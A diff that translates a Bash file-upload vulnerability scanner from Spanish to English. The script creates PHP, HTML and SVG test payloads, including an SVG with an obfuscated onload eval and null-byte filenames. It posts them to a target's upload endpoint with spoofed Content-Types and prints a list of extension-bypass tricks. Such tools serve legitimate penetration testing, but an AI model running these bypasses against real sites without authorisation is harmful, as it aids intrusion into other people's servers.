@@ -1,7 +1,7 @@
 #!/bin/bash
 # ============================================
 # File Upload Scanner v2.0
-# Pruebas reales de upload PHP, HTML, SVG
+# Real PHP, HTML, SVG upload tests
 # ============================================
 
 CYAN='\033[0;36m'
@@ -11,8 +11,8 @@ YELLOW='\033[1;33m'
 NC='\033[0m'
 
 if [ $# -eq 0 ]; then
-    echo -e "${RED}Uso: $0 <url> [upload_endpoint]${NC}"
-    echo "Ejemplo: $0 https://sistemataller.com /prueba-gratis"
+    echo -e "${RED}Usage: $0 <url> [upload_endpoint]${NC}"
+    echo "Example: $0 https://sistemataller.com /prueba-gratis"
     exit 1
 fi
 
@@ -33,10 +33,10 @@ TMPDIR=$(mktemp -d)
 VULNS_FOUND=0
 
 # ============================================
-# FASE 1: CREAR PAYLOADS
+# PHASE 1: CREATE PAYLOADS
 # ============================================
 
-echo -e "${YELLOW}[1/6] Creando payloads de prueba...${NC}"
+echo -e "${YELLOW}[1/6] Creating test payloads...${NC}"
 echo ""
 
 # PHP Payloads
@@ -97,7 +97,7 @@ cat > "$TMPDIR/shell.php.svg" << 'SVGEOF'
 <svg xmlns="http://www.w3.org/2000/svg"><script>document.title="XSS_PHP_SVG"</script></svg>
 SVGEOF
 
-# SVG con payload avanzado
+# SVG with advanced payload
 cat > "$TMPDIR/shell_advanced.svg" << 'SVGADV'
 <?xml version="1.0" standalone="no"?>
 <svg xmlns="http://www.w3.org/2000/svg" onload="eval(atob('ZG9jdW1lbnQuaXRsZT0iWFNTX0FERkFOQ0VEIik='))">
@@ -110,44 +110,44 @@ echo '<?php echo "BYPASS_SPACE"; ?>' > "$TMPDIR/bypass space.php"
 echo '<?php echo "BYPASS_TAB"; ?>' > "$TMPDIR/bypass	tab.php"
 echo '<?php echo "BYPASS_NULL"; ?>' > "$TMPDIR/bypass%00.php"
 
-echo -e "${GREEN}  ✓ Payloads creados${NC}"
+echo -e "${GREEN}  ✓ Payloads created${NC}"
 
 # ============================================
-# FASE 2: DETECTAR ENDPOINT DE UPLOAD
+# PHASE 2: DETECT UPLOAD ENDPOINT
 # ============================================
 
 echo ""
-echo -e "${YELLOW}[2/6] Detectando endpoint de upload...${NC}"
+echo -e "${YELLOW}[2/6] Detecting upload endpoint...${NC}"
 echo ""
 
-# Buscar formularios con input file
+# Search for forms with file input
 UPLOAD_FOUND=0
 curl -s "$TARGET_URL" | grep -oP '<form[^>]*>' | while read -r form; do
     if echo "$form" | grep -qi "file\|upload\|logo\|image"; then
-        echo -e "${GREEN}  ✓ Formulario encontrado: $form${NC}"
+        echo -e "${GREEN}  ✓ Form found: $form${NC}"
         UPLOAD_FOUND=1
     fi
 done
 
-# Buscar input file
+# Search for file input
 curl -s "$TARGET_URL" | grep -oP '<input[^>]*type=["\x27]file["\x27][^>]*>' | while read -r input; do
-    echo -e "${GREEN}  ✓ Input file: $input${NC}"
+    echo -e "${GREEN}  ✓ File input: $input${NC}"
     UPLOAD_FOUND=1
 done
 
-# Buscar accept
+# Search for accept
 echo ""
-echo -e "${CYAN}Tipos aceptados:${NC}"
+echo -e "${CYAN}Accepted types:${NC}"
 curl -s "$TARGET_URL" | grep -oP 'accept=["\x27][^"]*["\x27]' | while read -r line; do
     echo "  $line"
 done
 
 # ============================================
-# FASE 3: PROBAR PHP UPLOADS
+# PHASE 3: TEST PHP UPLOADS
 # ============================================
 
 echo ""
-echo -e "${YELLOW}[3/6] Probando uploads PHP...${NC}"
+echo -e "${YELLOW}[3/6] Testing PHP uploads...${NC}"
 echo ""
 
 PHP_PAYLOADS=(
@@ -166,9 +166,9 @@ PHP_PAYLOADS=(
 for payload in "${PHP_PAYLOADS[@]}"; do
     FILE="$TMPDIR/$payload"
     if [ -f "$FILE" ]; then
-        echo -e "${CYAN}  Probando: $payload${NC}"
+        echo -e "${CYAN}  Testing: $payload${NC}"
         
-        # Intentar upload con diferentes Content-Types
+        # Try upload with different Content-Types
         for ct in "application/x-php" "image/jpeg" "image/png" "application/octet-stream"; do
             RESP=$(curl -s -o /dev/null -w "%{http_code}" \
                 -X POST "$FULL_URL" \
@@ -176,7 +176,7 @@ for payload in "${PHP_PAYLOADS[@]}"; do
                 2>/dev/null)
             
             if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
-                echo -e "${RED}    ⚠️ ACEPTADO con Content-Type: $ct (HTTP $RESP)${NC}"
+                echo -e "${RED}    ⚠️ ACCEPTED with Content-Type: $ct (HTTP $RESP)${NC}"
                 VULNS_FOUND=$((VULNS_FOUND + 1))
             fi
         done
@@ -184,11 +184,11 @@ for payload in "${PHP_PAYLOADS[@]}"; do
 done
 
 # ============================================
-# FASE 4: PROBAR HTML UPLOADS
+# PHASE 4: TEST HTML UPLOADS
 # ============================================
 
 echo ""
-echo -e "${YELLOW}[4/6] Probando uploads HTML...${NC}"
+echo -e "${YELLOW}[4/6] Testing HTML uploads...${NC}"
 echo ""
 
 HTML_PAYLOADS=(
@@ -211,7 +211,7 @@ for payload in "${HTML_PAYLOADS[@]}"; do
                 2>/dev/null)
             
             if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
-                echo -e "${RED}    ⚠️ ACEPTADO con Content-Type: $ct (HTTP $RESP)${NC}"
+                echo -e "${RED}    ⚠️ ACCEPTED with Content-Type: $ct (HTTP $RESP)${NC}"
                 VULNS_FOUND=$((VULNS_FOUND + 1))
             fi
         done
@@ -219,11 +219,11 @@ for payload in "${HTML_PAYLOADS[@]}"; do
 done
 
 # ============================================
-# FASE 5: PROBAR SVG UPLOADS
+# PHASE 5: TEST SVG UPLOADS
 # ============================================
 
 echo ""
-echo -e "${YELLOW}[5/6] Probando uploads SVG...${NC}"
+echo -e "${YELLOW}[5/6] Testing SVG uploads...${NC}"
 echo ""
 
 SVG_PAYLOADS=(
@@ -246,7 +246,7 @@ for payload in "${SVG_PAYLOADS[@]}"; do
                 2>/dev/null)
             
             if [ "$RESP" = "200" ] || [ "$RESP" = "201" ]; then
-                echo -e "${RED}    ⚠️ ACEPTADO con Content-Type: $ct (HTTP $RESP)${NC}"
+                echo -e "${RED}    ⚠️ ACCEPTED with Content-Type: $ct (HTTP $RESP)${NC}"
                 VULNS_FOUND=$((VULNS_FOUND + 1))
             fi
         done
@@ -254,17 +254,17 @@ for payload in "${SVG_PAYLOADS[@]}"; do
 done
 
 # ============================================
-# FASE 6: BYPASS AVANZADOS
+# PHASE 6: ADVANCED BYPASSES
 # ============================================
 
 echo ""
-echo -e "${YELLOW}[6/6] Probando bypass avanzados...${NC}"
+echo -e "${YELLOW}[6/6] Testing advanced bypasses...${NC}"
 echo ""
 
-echo -e "${CYAN}  Payloads de bypass:${NC}"
+echo -e "${CYAN}  Bypass payloads:${NC}"
 echo ""
 echo "    PHP Bypass:"
-echo "      shell.php.jpg           - Doble extensión"
+echo "      shell.php.jpg           - Double extension"
 echo "      shell.php%00.jpg        - Null byte"
 echo "      shell.php%0a.jpg        - Newline"
 echo "      shell.php%0d%0a.jpg     - CRLF"
@@ -285,36 +285,36 @@ echo "      shell.php.svg           - SVG after PHP"
 echo "      shell.svg%00.php        - Null byte"
 echo ""
 echo "    Content-Type Bypass:"
-echo "      - Enviar PHP con Content-Type: image/png"
-echo "      - Enviar HTML con Content-Type: image/jpeg"
-echo "      - Enviar SVG con Content-Type: text/plain"
+echo "    - Send PHP with Content-Type: image/png"
+echo "    - Send HTML with Content-Type: image/jpeg"
+echo "    - Send SVG with Content-Type: text/plain"
 echo ""
 
 # ============================================
-# RESUMEN
+# SUMMARY
 # ============================================
 
 echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
-echo -e "${GREEN}  RESUMEN DE PRUEBAS${NC}"
+echo -e "${GREEN}  TEST SUMMARY${NC}"
 echo -e "${GREEN}═══════════════════════════════════════════════════════════════${NC}"
 echo ""
-echo -e "  Payloads probados: ${CYAN}$(ls $TMPDIR | wc -l)${NC}"
-echo -e "  Uploads aceptados: ${RED}$VULNS_FOUND${NC}"
+echo -e "  Payloads tested: ${CYAN}$(ls $TMPDIR | wc -l)${NC}"
+echo -e "  Uploads accepted: ${RED}$VULNS_FOUND${NC}"
 echo ""
 
 if [ $VULNS_FOUND -gt 0 ]; then
-    echo -e "${RED}  ⚠️ VULNERABILIDADES ENCONTRADAS${NC}"
+    echo -e "${RED}  ⚠️ VULNERABILITIES FOUND${NC}"
     echo ""
-    echo "  Acciones recomendadas:"
-    echo "    1. Verificar uploads aceptados"
-    echo "    2. Probar ejecución de código"
-    echo "    3. Verificar si los archivos son accesibles"
-    echo "    4. Reportar al equipo de seguridad"
+    echo "  Recommended actions:"
+    echo "    1. Verify accepted uploads"
+    echo "    2. Test code execution"
+    echo "    3. Verify if files are accessible"
+    echo "    4. Report to security team"
 else
-    echo -e "${GREEN}  ✓ No se encontraron uploads vulnerables${NC}"
+    echo -e "${GREEN}  ✓ No vulnerable uploads found${NC}"
 fi
 
-# Limpiar
+# Clean up
 rm -rf "$TMPDIR"
 
 echo ""
